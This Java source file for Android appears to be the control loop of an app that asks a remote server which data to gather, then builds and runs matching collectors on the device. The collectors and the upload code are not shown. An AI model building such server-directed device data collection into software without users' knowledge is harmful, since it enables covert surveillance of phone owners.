package com.xaviar.frm;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;

import org.codehaus.jackson.JsonParseException;
import org.codehaus.jackson.map.JsonMappingException;
import org.codehaus.jackson.map.ObjectMapper;

import android.content.Context;
import android.util.Log;

import com.xaviar.collect.CollectData;
import com.xaviar.utils.CollectorHelper;
import com.xaviar.utils.GenericUtil;
import com.xaviar.utils.NetworkUtil;

public class ServerFsm {

	private static final String TAG = ServerFsm.class.getSimpleName();;

	public void execute(Context context) {
		if(!NetworkUtil.isNetworkAvailable(context))
		{
		  // no net available!
			return;
		}
		if(!NetworkUtil.isURLReachable(context))
		{
		  Log.w(TAG, "No server availabl,server url:"  + NetworkUtil.getServerUrl(context));	
		  return;	
		}
		
		DataHolder dh = getServerWish(context);
		handleServerWish(dh, context);
	}

	public static void handleServerWish(DataHolder dh, Context ctx) {
		String jsonStr = "";
		if (null == dh) {
			Log.e(TAG, "Got null DataHolder from Server for server wish..!!");
			// return;
		} else {
			jsonStr = dh.get(DataHolder.STATE);
		}
		
		try {
			HashMap<String,String> result = new ObjectMapper().readValue(jsonStr,HashMap.class);
			if (result != null && !result.isEmpty()) {
				Collection<ICollector> iCollectList = CollectorHelper.createICollectList(result);
				if (null == iCollectList) {
					Log.e(TAG,"Got null set in DataHolder from Server for server wish..!!");
					return;
				}
				Log.d(TAG,"num of elements in set dataHolder:"+ iCollectList.size());
				CollectData coolData = new CollectData(ctx);
				coolData.register(iCollectList);
				coolData.collect();
			}
		} catch (JsonParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			 Log.e(TAG, e.getLocalizedMessage());	
		} catch (JsonMappingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			 Log.e(TAG, e.getLocalizedMessage());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			 Log.e(TAG, e.getLocalizedMessage());
		}
	}

	public static DataHolder getServerWish(Context ctx) {
		String genericData = DataHolder.GET_SERVER_WISH;
		DataHolder dhReturn = NetworkUtil.processData(genericData,DataHolder.STATE, ctx);
		return dhReturn;
	}

}
